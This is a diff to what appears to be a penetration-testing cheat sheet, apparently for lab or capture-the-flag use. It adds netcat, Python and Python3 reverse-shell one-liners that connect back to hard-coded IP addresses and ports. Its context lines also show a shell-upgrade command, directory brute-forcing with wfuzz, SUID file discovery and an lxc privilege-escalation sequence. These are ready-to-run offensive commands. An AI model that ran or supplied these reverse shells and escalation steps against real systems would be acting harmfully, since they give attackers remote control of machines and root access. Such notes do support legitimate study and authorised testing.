@@ -17,9 +17,18 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 ---
-#### Reverse shell using Netcat:
+#### Reverse shells
+* nc
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
+```
+* python
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+* python3
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
 ---
@@ -53,7 +62,6 @@ wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 
 - [md5hashing](https://md5hashing.net/hash)
 - [cyberchef](https://gchq.github.io/CyberChef/)
 
----------------------------------
 ## Additional Notes
 Here are some additional notes that might come in handy during your penetration testing journey:
 
@@ -79,7 +87,7 @@ gzip -d file.gz
 ```
 
 ---
-#### Privilege Escalation:
+### Privilege Escalation:
 Identify SUID/SGID files:
 ```
 find / -type f -perm /4000 2>/dev/null
@@ -96,4 +104,5 @@ lxc start ignite
 lxc exec ignite /bin/sh
 ```
 
+---
 Happy hacking!
